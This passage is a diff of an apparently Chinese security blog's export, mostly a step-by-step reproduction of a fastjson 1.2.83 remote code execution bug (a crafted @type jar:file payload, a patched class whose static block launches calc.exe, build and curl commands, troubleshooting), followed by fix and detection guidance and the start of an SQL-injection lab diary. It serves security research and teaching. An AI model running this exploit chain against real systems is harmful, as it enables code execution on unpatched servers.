class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>).start();</span><br><span class="line">            sb.append(<span class="string">&quot;command  : calc.exe -&gt; &quot;</span>).append(p).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ignored) &#123; &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Files.write(Paths.get(<span class="string">&quot;C:\\fj\\rce-proof.txt&quot;</span>),</span><br><span class="line">                    sb.toString().getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ignored) &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-三处写法是强制的，不是风格选择"><a href="#2-3-三处写法是强制的，不是风格选择" class="headerlink" title="2.3 三处写法是强制的，不是风格选择"></a>2.3 三处写法是强制的，不是风格选择</h2><table>
+<thead>
+<tr>
+<th>写法</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>@JSONType</code></td>
+<td>就是 1.3 那张”白名单通行证”，缺了它 <code>checkAutoType</code> 直接抛异常</td>
+</tr>
+<tr>
+<td>干活写在 <code>static {}</code></td>
+<td>类定义后、实例化前就会执行，是最稳的触发点，不依赖构造方法</td>
+</tr>
+<tr>
+<td>不引用自己 jar 里的其它类</td>
+<td>定义它的 loader 也负责找依赖，而依赖不在目标 classpath 上</td>
+</tr>
+</tbody></table>
+<h2 id="2-4-五个硬约束"><a href="#2-4-五个硬约束" class="headerlink" title="2.4 五个硬约束"></a>2.4 五个硬约束</h2><table>
+<thead>
+<tr>
+<th>#</th>
+<th>约束</th>
+<th>违反了会怎样</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>@type</code> 里的 <code>.</code> 会被换成 <code>/</code>，所以<strong>路径里不能有点</strong></td>
+<td><code>f.jar</code> → <code>f/jar</code>，路径错，<code>stream=false</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>类必须在<strong>默认包</strong>，jar 内路径要和 <code>@type</code> 还原后一致</td>
+<td><code>stream=false</code>，探测阶段就失败</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>this_class</code> 必须逐字等于 <code>@type</code> 还原后的名字</td>
+<td><code>NoClassDefFoundError ... (wrong name: Evil)</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>字节码版本 ≤ 目标 JVM</td>
+<td><code>UnsupportedClassVersionError</code>（现象和”没打通”几乎一样）</td>
+</tr>
+<tr>
+<td>5</td>
+<td>类必须<strong>自包含</strong></td>
+<td><code>NoClassDefFoundError: pwn/Pwn</code></td>
+</tr>
+</tbody></table>
+<p>两个隐含限制：<code>typeName.length() &lt; 192</code>（1.2.83 入口就有这个判断）；类名里不能出现连续斜杠。</p>
+<p>所以 <strong>jar 文件名不能带点</strong>（<code>f</code> 可以，<code>f.jar</code> 不行），也<strong>不能放在子目录里</strong>。</p>
+<h2 id="2-5-最关键的一步：改-this-class"><a href="#2-5-最关键的一步：改-this-class" class="headerlink" title="2.5 最关键的一步：改 this_class"></a>2.5 最关键的一步：改 <code>this_class</code></h2><p>这是整个复现里唯一的”门槛”，也是最容易被忽略的地方。</p>
+<p><strong>JVM 有一条硬性校验</strong>：</p>
+<blockquote>
+<p><code>defineClass(name, bytes)</code> 里的 <code>name</code>，必须和 class 文件里 <code>this_class</code> 自称的名字<strong>逐字相同</strong>。</p>
+</blockquote>
+<p>而 fastjson 传给 <code>defineClass</code> 的是 <code>@type</code> 的原始值（含 <code>:</code> 和 <code>!</code>），不是点号替换后的值。所以：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">@type                jar:file:.C:.fj.f!.Evil</span><br><span class="line">   ↓ 1482 行点号换斜杠</span><br><span class="line">实际请求的类名        jar:file:/C:/fj/f!/Evil</span><br><span class="line">   ↓ JVM 要求 this_class 必须等于它</span><br><span class="line">class 里必须写        jar:file:/C:/fj/f!/Evil      ← 原版 class 里是 &quot;Evil&quot;</span><br></pre></td></tr></table></figure>
+
+<p>不改的后果：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">java.lang.NoClassDefFoundError: jar:file:/C:/fj/f!/Evil (wrong name: Evil)</span><br></pre></td></tr></table></figure>
+
+<p><strong>这条报错是整条链上最有价值的反馈</strong>：<code>wrong name</code> 说明 <code>defineClass</code> 已经被调到了、字节码已经进 JVM 了，只差最后一道命名校验。看到它，说明 SSRF、读取、注解识别全部成功。</p>
+<p>更坑的是，这个真实异常在 <code>TypeUtils.loadClass</code> 里被 <code>catch (Throwable e) { e.printStackTrace(); }</code> 吞掉，业务侧只看到一句笼统的 <code>autoType is not support</code>。所以排查时必须绕开 fastjson 直接调 classloader——靶场的 <code>/rawload</code> 就是干这个的。</p>
+<p><strong>改名的原理</strong>：<code>this_class</code> 是常量池索引（<code>u2</code>），指向一条 <code>CONSTANT_Class</code>，那条再指向一条 <code>CONSTANT_Utf8</code>，真正的类名字节存在这里。</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">magic            u4   CAFEBABE</span><br><span class="line">major_version    u2   ← 52=Java 8，65=Java 21</span><br><span class="line">constant_pool[]       ← 变长表</span><br><span class="line">this_class       u2   ← 索引，不是字符串</span><br></pre></td></tr></table></figure>
+
+<p>所以只需要改那条 UTF-8 的内容，<strong>其它索引全不用动</strong>，字段、方法、注解表原样保留：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">改名前  this_class: #34    // Evil</span><br><span class="line">改名后  this_class: #34    // &quot;jar:file:/C:/fj/f!/Evil&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>payload/patch_name.py</code> 做的就是这件事：解析常量池（按 tag 决定每条占几字节，<code>long</code>&#x2F;<code>double</code> 占两个槽位）→ 顺着 <code>Class → name_index</code> 找到 UTF-8 → 替换 → 重新拼装。</p>
+<h2 id="2-6-四步造出来"><a href="#2-6-四步造出来" class="headerlink" title="2.6 四步造出来"></a>2.6 四步造出来</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0) 准备目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /c/fj/build &amp;&amp; <span class="built_in">cd</span> /c/fj/build</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) 编译（--release 8 是硬要求，否则目标 JDK 8 会 UnsupportedClassVersionError）</span></span><br><span class="line">javac --release 8 -nowarn -<span class="built_in">cp</span> &lt;项目&gt;/out/fastjson-1.2.83.jar \</span><br><span class="line">      -d . &lt;项目&gt;/payload/windows/Evil.java</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 改名：写 @type 点号还原后的名字，不是 @type 原样</span></span><br><span class="line">python &lt;项目&gt;/payload/patch_name.py Evil.class \</span><br><span class="line">  <span class="string">&#x27;jar:file:/C:/fj/f!/Evil&#x27;</span> Evil.class</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 打包（jar 命令要求输出名 ≥3 字符，先打成 payload.jar 再改名）</span></span><br><span class="line">jar cf payload.jar Evil.class &amp;&amp; <span class="built_in">cp</span> payload.jar /c/fj/f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4) 校验</span></span><br><span class="line">javap -v -p Evil.class | grep -E <span class="string">&quot;this_class|major version&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>第 4 步预期：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">major version: 52</span><br><span class="line">this_class: #34                          // &quot;jar:file:/C:/fj/f!/Evil&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>major version: 52</code> 是 Java 8 字节码，<code>this_class</code> 必须是 <code>@type</code> 还原后的完整名字。这两行对不上，后面一定失败。</p>
+<hr>
+<h1 id="3-具体怎么复现"><a href="#3-具体怎么复现" class="headerlink" title="3. 具体怎么复现"></a>3. 具体怎么复现</h1><h2 id="3-1-单机版（Windows，5-步）"><a href="#3-1-单机版（Windows，5-步）" class="headerlink" title="3.1 单机版（Windows，5 步）"></a>3.1 单机版（Windows，5 步）</h2><p><strong>第 1 步：起靶场</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /c/fj &amp;&amp; <span class="built_in">cd</span> /c/fj</span><br><span class="line"><span class="built_in">cp</span> &lt;项目&gt;/out/app-vuln-1.2.83.jar app.jar</span><br><span class="line">java -jar app.jar --server.port=18084 &gt; app.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+<p><strong>第 2 步：环境自检</strong>（这一步决定要不要继续）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s http://127.0.0.1:18084/status; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;fastjsonVersion&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.2.83&quot;</span><span class="punctuation">,</span><span class="attr">&quot;typeNameCheck&quot;</span><span class="punctuation">:</span><span class="string">&quot;absent (&lt;=1.2.83)&quot;</span><span class="punctuation">,</span><span class="attr">&quot;safeMode&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;autoTypeSupport&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;javaVersion&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.8.0_66&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;launchedBy&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.springframework.boot.loader.LaunchedURLClassLoader&quot;</span><span class="punctuation">,</span><span class="attr">&quot;vulnerable&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>四个字段对上前提里的四条：<code>vulnerable:true</code>、<code>autoTypeSupport:false</code>（证明不用开 AutoType）、<code>launchedBy</code> 是 <code>LaunchedURLClassLoader</code>、<code>safeMode:false</code>。任何一个不符，先解决再往下。</p>
+<p><strong>第 3 步：探测</strong>（只读字节 + 扫注解，不定义类）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s -G http://127.0.0.1:18084/debug --data-urlencode <span class="string">&#x27;type=jar:file:.C:.fj.f!.Evil&#x27;</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;resource&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:/C:/fj/f!/Evil.class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span><span class="number">2107</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;jsonTypeDirect&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;checkAutoType&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.C:.fj.f!.Evil&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>stream:true</code> 表示读到了字节，<code>bytes:2107</code> 正好是 class 长度，<code>jsonTypeDirect:true</code> 表示扫到了 <code>@JSONType</code>。这三个值说明前三段已经成立，只剩定义。</p>
+<p><strong>第 4 步：触发</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s -X POST http://127.0.0.1:18084/parse \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:file:.C:.fj.f!.Evil&quot;&#125;&#x27;</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;ok&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;class&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.C:.fj.f!.Evil&quot;</span><span class="punctuation">,</span><span class="attr">&quot;result&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.C:.fj.f!.Evil@1e29ab1a&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>同时屏幕弹出计算器，<code>C:\fj\rce-proof.txt</code> 生成。</p>
+<p><strong>第 5 步：确认副作用</strong>（唯一可靠的判据）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /c/fj/rce-proof.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">CVE-2026-16723 windows repro - code executed</span><br><span class="line">jvm-user : MECHREVO</span><br><span class="line">java     : 1.8.0_66</span><br><span class="line">loader   : org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c</span><br><span class="line">command  : calc.exe -&gt; java.lang.ProcessImpl@76fc7ec7</span><br></pre></td></tr></table></figure>
+
+<p><code>loader</code> 这行证明代码跑在靶场那个 JVM 里，<code>command</code> 那行证明真的起了进程。**计算器的父进程就是 PID 27852 的 <code>java.exe</code>**，演示时可以当场用任务管理器指出来。</p>
+<h2 id="3-2-跨机器版（虚机当攻击机，本机当靶机）"><a href="#3-2-跨机器版（虚机当攻击机，本机当靶机）" class="headerlink" title="3.2 跨机器版（虚机当攻击机，本机当靶机）"></a>3.2 跨机器版（虚机当攻击机，本机当靶机）</h2><p>更接近真实攻击，演示效果最好。本机靶场监听 <code>0.0.0.0:18084</code>，虚机通过 VMware NAT 网关 <code>192.168.244.1</code> 访问。</p>
+<p>虚机里：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1) 先测连通（返回 JSON 就成了，注意 javaVersion 是宿主机的 1.8.0_66，不是虚机的 17）</span></span><br><span class="line">curl -s -m 5 http://192.168.244.1:18084/status; <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 直接打</span></span><br><span class="line">curl -s -m 30 -X POST http://192.168.244.1:18084/parse \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:file:.C:.fj.g!.Evil&quot;&#125;&#x27;</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<p>两个必须记住的点：</p>
+<ul>
+<li><strong><code>@type</code> 里的路径是靶机的</strong>，不是攻击机的。解析发生在宿主机 JVM，写虚机的 <code>/tmp/...</code> 一定 <code>stream=false</code>；</li>
+<li><strong>计算器弹在靶机桌面</strong>（宿主机），虚机里只会看到 <code>ok:true</code>。</li>
+</ul>
+<p><strong>关于防火墙</strong>（实测结论，别被吓到）：Windows 防火墙默认不拦回环流量，出站默认放行，而入站的 <code>java.exe</code> 通常早就有放行规则（本机 <code>javapath\java.exe</code> 是指向 <code>C:\Program Files\Java\jre1.8.0_66</code> 的符号链接，该路径已有 Allow 规则）。所以<strong>第 1 步能返回 JSON 就说明通</strong>，不需要额外加规则。</p>
+<p>只有当第 1 步超时才需要：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;fjlab-18084&quot;</span> <span class="literal">-Direction</span> Inbound `</span><br><span class="line">  <span class="literal">-Protocol</span> TCP <span class="literal">-LocalPort</span> <span class="number">18084</span> <span class="literal">-Action</span> Allow <span class="literal">-Profile</span> Any</span><br><span class="line"><span class="comment"># 演示完删掉</span></span><br><span class="line"><span class="built_in">Remove-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;fjlab-18084&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>要理解的是：<strong>防火墙不是这条链的防线。</strong> 它只决定”包能不能进来”，不决定”进来之后 JVM 做什么”。所以哪怕把入站全封了，本机 <code>127.0.0.1</code> 打自己依然能弹计算器。</p>
+<h2 id="3-3-对照：同一个-payload-打-1-2-84"><a href="#3-3-对照：同一个-payload-打-1-2-84" class="headerlink" title="3.3 对照：同一个 payload 打 1.2.84"></a>3.3 对照：同一个 payload 打 1.2.84</h2><p>这是把”漏洞利用”和”文件落地”区分开的最直接证据——<strong>同一份 <code>C:\fj\f</code>、同一个请求体，只换 fastjson 版本</strong>。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /c/fj</span><br><span class="line">java -jar app-fixed.jar --server.port=18087 &gt; fixed.log 2&gt;&amp;1 &amp;</span><br><span class="line">curl -s http://127.0.0.1:18087/status; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<p>预期 <code>typeNameCheck</code> 变成 <code>present (1.2.84+)</code>。然后打：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /c/fj/rce-proof.txt</span><br><span class="line">curl -s -m 20 -X POST http://127.0.0.1:18087/parse \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:file:.C:.fj.f!.Evil&quot;&#125;&#x27;</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>实例</th>
+<th><code>/status</code></th>
+<th><code>/parse</code></th>
+<th>计算器</th>
+<th>证明文件</th>
+<th>绕过 fastjson 直调 loader</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.83</td>
+<td><code>absent</code></td>
+<td><code>ok:true</code></td>
+<td>弹出</td>
+<td>生成</td>
+<td>可定义</td>
+</tr>
+<tr>
+<td>1.2.84</td>
+<td><code>present (1.2.84+)</code></td>
+<td><code>autoType is not support</code></td>
+<td>不弹</td>
+<td><strong>未生成</strong></td>
+<td><strong>仍可定义</strong></td>
+</tr>
+</tbody></table>
+<p>最后一行很关键：<strong>classloader 的解析能力没变，修复只加在 fastjson 入口</strong>。所以”换个 loader &#x2F; 换个部署形态”不构成缓解，升级 + 出站管控才是。</p>
+<blockquote>
+<p>判断是否已修复，**不要看 <code>JSON.VERSION</code>**——1.2.84 里这个常量仍然是 <code>&quot;1.2.83&quot;</code>。看依赖坐标，或看 <code>hasIllegalTypeNameChars</code> 方法在不在（<code>/status</code> 的 <code>typeNameCheck</code> 就是这么自查的）。</p>
+</blockquote>
+<h2 id="3-4-怎么判断成功：三层证据"><a href="#3-4-怎么判断成功：三层证据" class="headerlink" title="3.4 怎么判断成功：三层证据"></a>3.4 怎么判断成功：三层证据</h2><p>这个漏洞里，HTTP 200 和 <code>ok:true</code> 都不可靠，好几个”成功”的步骤返回的恰恰是报错。</p>
+<table>
+<thead>
+<tr>
+<th>层次</th>
+<th>看什么</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1. 命令跑没跑起来</td>
+<td><code>echo $?</code></td>
+<td><code>exit=0</code> 才说明命令本身没错；<code>28</code>&#x3D;超时，<code>7</code>&#x3D;端口没起</td>
+</tr>
+<tr>
+<td>2. 动作有没有发生</td>
+<td>端口监听、对方日志、进程树</td>
+<td>证明链路走到哪一步</td>
+</tr>
+<tr>
+<td>3. <strong>有没有留下副作用</strong></td>
+<td>证明文件、计算器进程</td>
+<td><strong>唯一不会骗人的判据</strong></td>
+</tr>
+</tbody></table>
+<p>每一段的判定点，以及那些”看起来失败、其实成功”的情况：</p>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>成功证据</th>
+<th>假失败</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>起靶场</td>
+<td><code>vulnerable:true</code></td>
+<td>启动日志一大段，正常</td>
+</tr>
+<tr>
+<td>SSRF</td>
+<td>攻击者日志多出 <code>HEAD /probe.class</code></td>
+<td>返回 <code>autoType is not support</code> 是预期的</td>
+</tr>
+<tr>
+<td>读字节</td>
+<td><code>stream=true</code>、<code>bytes</code> 非零</td>
+<td><code>checkAutoTypeError</code> 有值，说明只到探测</td>
+</tr>
+<tr>
+<td>改名前</td>
+<td><code>/rawload</code> 报 <code>(wrong name: Evil)</code></td>
+<td><strong>这条报错是最好的消息</strong></td>
+</tr>
+<tr>
+<td>落地</td>
+<td><code>ok:true</code> + 证明文件 + 进程存在</td>
+<td>——</td>
+</tr>
+<tr>
+<td>1.2.84 对照</td>
+<td><code>ok:false</code> + 证明文件不存在</td>
+<td>这里的”失败”正是修复生效</td>
+</tr>
+</tbody></table>
+<h2 id="3-5-失败排查表"><a href="#3-5-失败排查表" class="headerlink" title="3.5 失败排查表"></a>3.5 失败排查表</h2><table>
+<thead>
+<tr>
+<th>现象</th>
+<th>真实原因</th>
+<th>处理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>stream:false</code></td>
+<td>路径不对：Linux 路径打在 Windows 上、jar 名带点、类不在默认包</td>
+<td>用 <code>jar tf f</code> 看内部路径；确认 <code>@type</code> 点号还原后等于文件真实路径</td>
+</tr>
+<tr>
+<td><code>stream:true</code> 但 <code>jsonTypeDirect:false</code></td>
+<td>类上没写 <code>@JSONType</code>，或注解被 <code>RetentionPolicy</code> 限制</td>
+<td><code>javap -v -p Evil.class | grep -A2 RuntimeVisibleAnnotations</code></td>
+</tr>
+<tr>
+<td><code>wrong name: Evil</code></td>
+<td>没改 <code>this_class</code></td>
+<td>跑 <code>patch_name.py</code>，再用 <code>javap</code> 校验</td>
+</tr>
+<tr>
+<td><code>NoClassDefFoundError: pwn/Pwn</code></td>
+<td>类不自包含</td>
+<td>去掉对外部类的引用</td>
+</tr>
+<tr>
+<td><code>UnsupportedClassVersionError</code></td>
+<td>没用 <code>--release 8</code></td>
+<td>重新编译</td>
+</tr>
+<tr>
+<td><code>ClassFormatError: Illegal class name &quot;jar:http://...&quot;</code></td>
+<td>用了远程形态</td>
+<td>换 <code>jar:file:</code>，见 1.4</td>
+</tr>
+<tr>
+<td><code>ok:true</code> 但什么都没发生</td>
+<td>类名命中缓存，<code>&lt;clinit&gt;</code> 不再执行</td>
+<td>换 jar 名（<code>f</code>→<code>g</code>）或重启靶场，见 3.6</td>
+</tr>
+</tbody></table>
+<h2 id="3-6-类缓存陷阱（演示最容易翻车的地方）"><a href="#3-6-类缓存陷阱（演示最容易翻车的地方）" class="headerlink" title="3.6 类缓存陷阱（演示最容易翻车的地方）"></a>3.6 类缓存陷阱（演示最容易翻车的地方）</h2><p>同一个类名第二次打，会看到 <code>ok:true</code> 但<strong>什么都不发生</strong>。原因在 <code>TypeUtils.loadClass</code> 开头：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span>&lt;?&gt; <span class="variable">clazz</span> <span class="operator">=</span> mappings.get(className);</span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) <span class="keyword">return</span> clazz;</span><br></pre></td></tr></table></figure>
+
+<p>第一次加载时类已经初始化过，<code>&lt;clinit&gt;</code> 不会再执行。所以：</p>
+<ul>
+<li><code>ok:true</code> 只代表”类存在、实例创建成功”，<strong>不代表代码刚刚又跑了一遍</strong>；</li>
+<li>演示时每打一次就换一个类名（<code>f</code> → <code>g</code> → <code>h</code>，每次重新 patch），或者重启靶场。</li>
+</ul>
+<p>判断”这次到底执行没有”，看两个副作用：证明文件的 mtime、计算器进程数。</p>
+<hr>
+<h1 id="附录-A：修复与检测"><a href="#附录-A：修复与检测" class="headerlink" title="附录 A：修复与检测"></a>附录 A：修复与检测</h1><h2 id="A-1-1-2-84-改了什么"><a href="#A-1-1-2-84-改了什么" class="headerlink" title="A.1 1.2.84 改了什么"></a>A.1 1.2.84 改了什么</h2><p><code>checkAutoType</code> 入口新增（<code>ParserConfig.java</code> 1363–1367）：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a URL-special type name can never be a class name; reject it here the same way any</span></span><br><span class="line"><span class="comment">// unresolvable @type is rejected, so it never reaches the class loader</span></span><br><span class="line"><span class="keyword">if</span> (TypeUtils.hasIllegalTypeNameChars(typeName)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">hasIllegalTypeNameChars</span><span class="params">(String typeName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> typeName.indexOf(<span class="string">&#x27;:&#x27;</span>) &gt;= <span class="number">0</span> || typeName.indexOf(<span class="string">&#x27;!&#x27;</span>) &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>为什么四行就够</strong>：这个漏洞的每一种可达形态，都必须把 <code>jar:...!/...</code> 塞进 <code>@type</code>，而这种名字必然同时包含 <code>:</code> 和 <code>!</code>。在入口拒掉这两个字符，探测阶段就拿不到名字（<strong>SSRF 一起被堵</strong>），定义阶段也走不到 <code>defineClass</code>。</p>
+<h2 id="A-2-修复优先级"><a href="#A-2-修复优先级" class="headerlink" title="A.2 修复优先级"></a>A.2 修复优先级</h2><ol>
+<li>升 <strong>1.2.84</strong> 及以上维护版本；</li>
+<li>升不了就开 SafeMode：<code>-Dfastjson.parser.safeMode=true</code>（实测在探测之前就拒绝，PoC 端零请求）；</li>
+<li>换 <code>1.2.83_noneautotype</code> 构建；</li>
+<li>长期迁移 fastjson2（≥ 2.0.63）；</li>
+<li>配套：出站白名单（阻断回连）+ 禁止把请求体直接喂给 <code>JSON.parse</code>。</li>
+</ol>
+<h2 id="A-3-检测特征"><a href="#A-3-检测特征" class="headerlink" title="A.3 检测特征"></a>A.3 检测特征</h2><ul>
+<li><code>@type</code> 的值里同时出现 <code>:</code> 和 <code>!</code>，或出现 <code>jar:</code> &#x2F; <code>http:</code> &#x2F; <code>..</code> 组合；</li>
+<li>应用进程对陌生地址发起 <code>GET</code> &#x2F; <code>HEAD</code>，path 以 <code>.class</code> 结尾，UA 形如 <code>Java/1.17.0</code>；</li>
+<li>日志出现类名式异常：<code>wrong name: ...</code>、<code>Illegal class name &quot;jar:...&quot;</code>；</li>
+<li><code>/tmp</code> 出现小体积 jar，或应用进程拉起 <code>sh -c</code> &#x2F; <code>cmd /c</code> 子进程；</li>
+<li>进程内出现名字极不寻常的类（<code>jar:file:...</code> 这种类名在任何工具里都极其显眼）。</li>
+</ul>
+<hr>
+<h1 id="附录-B：边界与口径"><a href="#附录-B：边界与口径" class="headerlink" title="附录 B：边界与口径"></a>附录 B：边界与口径</h1><p>仅用于自有环境 &#x2F; 授权范围，靶场不要暴露公网。本套 payload 只做两件事：启动一个计算器、写一个证明文件；不含反弹 shell、不含持久化、不修改系统。</p>
+<p><strong>汇报时建议主动标注的两点</strong>：</p>
+<ol>
+<li>演示里 payload 是预先放在目标磁盘上的，模拟”攻击者已获得文件落地能力”（上传、临时目录等真实途径），不是凭一个请求凭空达成；</li>
+<li>远程 <code>jar:http://</code> 形态受 JVM 类名校验限制，只能做到 SSRF + 信任伪造，落地必须走本地路径。</li>
+</ol>
+<p>把这两点讲清楚，比”一个请求 getshell”更有说服力，也不容易被现场问倒。</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>JAVA安全</category>
+        <category>Fastjson</category>
+      </categories>
+  </entry>
+  <entry>
     <title></title>
-    <url>/2026/11/07/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/Java%20%E4%B8%AD%E7%9A%84sql%20%E6%B3%A8%E5%85%A5/</url>
+    <url>/2026/11/09/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/Java%20%E4%B8%AD%E7%9A%84sql%20%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[]]></content>
       <categories>
         <category>技术</category>
         <category>基础漏洞</category>
         <category>SQLi</category>
       </categories>
+  </entry>
+  <entry>
+    <title>sql 打靶日记23~75</title>
+    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/sql%20%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B023~75/</url>
+    <content><![CDATA[<h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><p>过滤了 –，#，先过滤#再过滤–，所以不能-#-来</p>
+<p>看报错’’1’’ LIMIT 0,1’，不看源码也可以知道大概sql语句是:<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+<p>主要就是想办法过处理后面那个单引号，就可以用or ‘1’&#x3D;’1</p>
